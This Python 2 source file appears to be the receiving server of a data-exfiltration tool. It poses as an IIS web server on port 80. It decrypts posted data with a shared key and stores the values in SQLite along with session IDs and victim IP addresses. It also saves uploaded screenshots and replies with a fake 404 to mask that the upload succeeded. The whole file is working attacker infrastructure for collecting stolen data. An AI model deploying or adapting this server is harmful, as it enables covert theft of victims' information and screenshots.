#!/usr/bin/env python
import contextlib
import SimpleHTTPServer
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
import SocketServer
import sqlite3
import urlparse
import pprint
import datetime
import re
import os
import cgi
import atexit
from sys import platform as _platform
from SocketServer import ThreadingMixIn
import threading
import traceback
from common_func import translateMessage, rec_split, randomword, readconfig

config = readconfig()
#Global config
key = config["key"]
target = config["target"]  #target domain for leak <YOUR_DOMAIN>
url_end = config["url_end"]
url_screenshot_end = config["url_screenshot_end"]
subdomain = config["subdomain"]
target_ip = config["target_ip"]

#Local config
listen_ip = '0.0.0.0'       #listen on all interfaces <YOUR_IP>
work_dir = './'             #working directory

class MyError(Exception):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return repr(self.value)

pidfile = "/tmp/httpserver.pid"
PORT = 80
#if _platform == "linux" or _platform == "linux2":
#    dbfile = 'http.db'
#    CWD = ''
#    logfile = 'http.log'
#else:
dbfile = 'http.db'
CWD = '.'
logfile = 'http.log'

con = sqlite3.connect(dbfile)

with con:
    cur = con.cursor()   
    try:  
        cur.execute("SELECT * FROM data")
        rows = cur.fetchall()
        for row in rows:
            print "old " + ','.join(str(i) for i in row)
            pass
        
        #cur.execute("DROP TABLE if exists data ")  
        #print ("table dropped")
    except:
        print ('sqlite table not exited')
    try:
        cur.execute("CREATE TABLE data(sessionid varchar, type varchar, value varchar, requestdate date, ip varchar)")
        cur.execute("CREATE UNIQUE INDEX IF NOT EXISTS MyUniqueIndex ON data (sessionid,type,value)")
    except:
        print ('sqlite create error')
    if con:
        try:
            pass
            #con.close()
        except:
            print ("cannot close database")        

class DBLoggingHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    SimpleHTTPServer.SimpleHTTPRequestHandler.server_version = "Microsoft-IIS/7.5."
    SimpleHTTPServer.SimpleHTTPRequestHandler.sys_version = ""
    
    def __init__(self, request, client_address, server):
        SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self, request, client_address, server)
        
    def do_GET(self):
                self.send_response(200)
                self.end_headers()
    def do_HEAD(self):
                self.send_response(200)
                self.end_headers()
                                
    def do_POST(self):
        if None != re.search( url_end +'*', self.path):
            ip = self.client_address[0]
            length = int(self.headers['Content-Length'])
            post_data = urlparse.parse_qs(self.rfile.read(length).decode('utf-8'))
            session = ""
            info = ""
            for key1, value in post_data.iteritems():
                if key1 == 'd':                
                    #print(value)
                    decrypted = translateMessage(value[0],key,'decrypt')
                    info_array = decrypted.split('|')
                if key1 == 's':                
                    #print(value)
                    session = value[0]
    
            for info in info_array: 
                type=''
                value2=''     
                try:
                    if len(info)>3:
                        type, value2 = info.split(' ',1)                
                        regex = re.compile(r"\W+")
                        value = regex.sub("-",value2.strip())
                        print (type,value)
                except:
                    with open(logfile, "a") as myfile: 
                        traceback.print_exc(file=myfile)
                        myfile.write("Info: " + info)
                    traceback.print_exc()
                    print("info: " + info)
                    continue
                try:
                    con = sqlite3.connect(dbfile)
                except OperationalError:
                    with open(logfile, "a") as myfile: 
                        traceback.print_exc(file=myfile) 
                    time.sleep(1)
                    con = sqlite3.connect(dbfile)
                cur = con.cursor()  
                try:
                    if len(value)>0:               
                        cur.execute("INSERT INTO data (sessionid, type, value, requestdate, ip) VALUES(?,?,?,?,?)", 
                                (session,type.upper(),value,str(datetime.datetime.utcnow()), str(ip)))
                except sqlite3.IntegrityError:
                    con.close()
                    continue
                con.commit()
                if con:
                    con.close()
            try:
                os.chdir(work_dir)
            except:
                pass
            return SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
        
        if None != re.search(url_screenshot_end + '*', self.path):
            try:
                try:
                    os.chdir(work_dir)
                except:
                    pass
                #os.chdir('..')
                ctype, pdict = cgi.parse_header(self.headers.getheader('content-type'))     
    
                if ctype == 'multipart/form-data' :     
                    # using cgi.FieldStorage instead, see 
                    # http://stackoverflow.com/questions/1417918/time-out-error-while-creating-cgi-fieldstorage-object     
                    fs = cgi.FieldStorage( fp = self.rfile, 
                                           headers = self.headers, # headers_, 
                                           environ={ 'REQUEST_METHOD':'POST' } # all the rest will come from the 'headers' object,     
                                           # but as the FieldStorage object was designed for CGI, absense of 'POST' value in environ     
                                           # will prevent the object from using the 'fp' argument !     
                                         )
                    ## print 'have fs'
                    #pprint(fs)
                else: raise Exception("Unexpected POST request")                   
                fs_up = fs.list[0]
                
                fullname = os.path.join(CWD, fs_up.filename)
                try:
                    if not os.path.exists(fullname):
                     with open(fullname, 'wb') as o:
                         # self.copyfile(fs['upfile'].file, o)
                         o.write( fs_up.file.read() ) 
                except:
                    pass         
                self.send_response(404)
                self.end_headers()
                
            except Exception as e:
                # pass
                with open(logfile, "a") as myfile: 
                    traceback.print_exc(file=myfile)
                traceback.print_exc()
                self.send_error(404,'POST to "%s" failed: %s' % (self.path, str(e)) )
            #return SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
        
Handler = DBLoggingHandler

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """ This class allows to handle requests in separated threads.
        No further content needed, don't touch this. """

#if _platform == "linux" or _platform == "linux2":
#    httpd = ThreadedHTTPServer(("", PORT), Handler)
#else:
httpd = ThreadedHTTPServer((listen_ip, PORT), Handler)

print "serving at port", PORT
httpd.serve_forever()